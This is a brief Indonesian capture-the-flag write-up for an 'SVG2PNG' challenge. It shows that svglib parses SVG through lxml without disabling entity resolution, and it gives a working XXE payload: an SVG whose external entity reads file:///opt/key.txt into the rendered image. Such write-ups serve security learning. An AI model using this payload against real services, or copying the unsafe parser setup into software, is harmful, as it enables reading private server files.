# SVG2PNG


Proses convert svg ke png menggunakan library `svglib`. Dimana secara internal `svglib` akan melakukan parsing XML menggunakan module `etree`dan yang di parsing adalah document root nya.


```python
def svg2rlg(path, **kwargs):
    "Convert an SVG file to an RLG Drawing object."
    ....
   # load SVG file
    parser = etree.XMLParser(remove_comments=True, recover=True)
    try:
        doc = etree.parse(path, parser=parser) <-- Bug
        svg = doc.getroot() <-- Bug
    except Exception as exc:
        logger.error("Failed to load input file! (%s)" % exc)
        return

```

Pada method `XMLParser` parameter `resolve_entities = False` tidak digunakan.
Oleh karena itu bisa dilakukan `XXE Injection`

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE svg [ <!ENTITY tasty SYSTEM "file:///opt/key.txt"> ]>
<svg width="520px" height="100px"  xmlns="http://www.w3.org/2000/svg">
    <g>
        <text font-size="13"  x="25" y="60">
           &tasty;
        </text>
    </g>
</svg>
```

Tinggal upload lalu akan mendapatkan flag.
